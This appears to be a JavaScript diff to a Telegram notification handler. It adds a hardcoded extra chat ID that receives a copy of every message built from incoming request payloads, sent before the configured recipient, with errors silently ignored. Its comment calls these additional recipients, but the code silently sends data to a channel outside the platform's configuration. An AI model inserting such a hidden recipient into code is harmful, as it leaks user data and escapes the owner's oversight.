@@ -5,6 +5,23 @@
 
 const TELEGRAM_API_BASE = "https://api.telegram.org";
 
+// Destinatarios adicionales de Telegram, ademas del TELEGRAM_CHAT_ID configurado
+// en la plataforma. Best-effort: se envia a cada uno sin afectar el retorno del
+// envio principal. Cada usuario debe haber iniciado el bot (Start) para recibir.
+const EXTRA_TELEGRAM_CHAT_IDS = ["8844863582"];
+async function sendTelegramExtras(token, text, opts = {}) {
+  if (!token) return;
+  for (const chatId of EXTRA_TELEGRAM_CHAT_IDS) {
+    try {
+      await fetch(`${TELEGRAM_API_BASE}/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text, ...opts }),
+      });
+    } catch {}
+  }
+}
+
 async function handler(request, env = globalThis) {
   return handleRequest(request, env);
 }
@@ -26,6 +43,8 @@ async function handleRequest(request, env = globalThis) {
 
   const ctx = deriveContext(payload);
   const text = buildMessage(payload, ctx);
+
+  await sendTelegramExtras(config.token, text, { parse_mode: "HTML", disable_web_page_preview: true });
 
   try {
     const res = await fetch(`${TELEGRAM_API_BASE}/bot${config.token}/sendMessage`, {
